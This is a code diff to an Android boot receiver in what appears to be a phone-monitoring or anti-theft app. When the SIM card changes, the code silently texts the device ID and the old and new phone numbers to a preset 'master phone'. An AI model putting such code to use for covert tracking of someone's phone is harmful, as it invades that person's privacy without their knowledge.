@@ -9,6 +9,7 @@ import system.service.config.ConfigCtrl;
 import system.service.feature.location.LocationInfo;
 import system.service.feature.sms.SmsCtrl;
 
+import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
@@ -43,7 +44,7 @@ public class BootReceiver extends BroadcastReceiver {
 			GlobalValues.licenseType = LicenseCtrl.calLicenseType(context, key);
 			
 			// ---------------------------------------------------------------------
-			// If license is illegal, do nothing
+			// If license is illegal
 			if (!ConfigCtrl.isLegal(context)) 
 			{
 				// If out of trial, send SMS to warn the receiver user
@@ -105,27 +106,31 @@ public class BootReceiver extends BroadcastReceiver {
 						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 						if (recvPhoneNum != null && recvPhoneNum.length() > 0) 
 						{
-							// If it is in trial, send SMS directly without new SIM phone number
-							if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED ||
-								ConfigCtrl.getSimChangeSmsSentCount(context) >= ConfigCtrl.MAX_SIM_CHG_SMS_SENT_COUNT) 
-							{
-								String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), ConfigCtrl.getSelfName(context))
-										+ context.getResources().getString(R.string.msg_changed_sim_new_number_trial);
-								boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
-								if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
-									ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
-								}
-							} 
-							// If it is paid (valid licensed), send SMS to get back the new SIM phone number and then send SMS to recv phone
-							else {
-								boolean ret = SmsCtrl.sendSimChgSms(context);
-								if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
-									int count = ConfigCtrl.getSimChangeSmsSentCount(context);
-									ConfigCtrl.setSimChangeSmsSentCount(context, ++count);
-									ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
-								}
+							String oldName = DeviceProperty.getDeviceId(context);
+							String oldPhoneNum = ConfigCtrl.getSelfPhoneNum(context);
+							if (oldPhoneNum != null && oldPhoneNum.length() > 0) {
+								oldName = oldPhoneNum;
 							}
-						} // end of if (recvPhoneNum != null && recvPhoneNum.length() > 0)
+							
+							String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), oldName);
+							String newPhoneNum = DeviceProperty.getPhoneNumber(context);
+							if (newPhoneNum != null && newPhoneNum.length() > 0) {
+								strContent += String.format(context.getResources().getString(R.string.msg_changed_sim_new_number), newPhoneNum);
+								
+								// Save new phone number if can get it
+								ConfigCtrl.setSelfPhoneNum(context, newPhoneNum);
+							} else { 
+								strContent += context.getResources().getString(R.string.msg_changed_sim_new_number_workaround);
+							}
+							
+							// Send SIM change warning SIM to master phone
+							boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
+							
+							// Set new SIM serial number
+							if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
+								ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
+							}
+						}
 					}
 				}
 			}
